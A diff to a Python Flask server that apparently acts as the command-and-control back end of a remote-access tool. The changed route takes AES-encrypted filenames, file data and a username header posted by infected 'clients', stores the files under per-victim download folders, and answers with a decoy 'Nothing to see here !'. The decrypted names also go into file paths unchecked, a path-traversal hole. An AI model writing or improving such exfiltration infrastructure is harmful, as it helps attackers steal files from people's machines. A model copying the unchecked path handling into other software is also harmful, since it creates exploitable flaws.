@@ -228,13 +228,17 @@ def shutdown():
 @app.route(file_receiver_url, methods=["POST"])
 def fr():
     filename = decrypt_command(aes_key, aes_iv, request.form["fn"].replace(" ","+"))
-    f = open(filename.strip("\x00"), "wb")
-    #fdata = request.form["token"].replace(" ", "+").encode().
     fdata = request.form["token"].replace(" ", "+")
+    username = request.headers["x-Authorization"]
+    fusername = decrypt_command(aes_key, aes_iv, username)
+    if os.path.isdir("downloads/%s" % fusername):
+        pass
+    else:
+        os.mkdir("downloads/%s" % fusername)
     raw_base64 = decrypt_command(aes_key, aes_iv, fdata)
-    #ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
+    stripped_filename = filename.strip("\x00")
+    f = open("downloads/%s/%s" % (fusername, stripped_filename), "wb")
     f.write(base64.b64decode(raw_base64.encode()))
-    #f.write(base64.b64decode(raw_base64.decode("UTF-16LE")))
     f.close()
     print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
     response = make_response("Nothing to see here !")
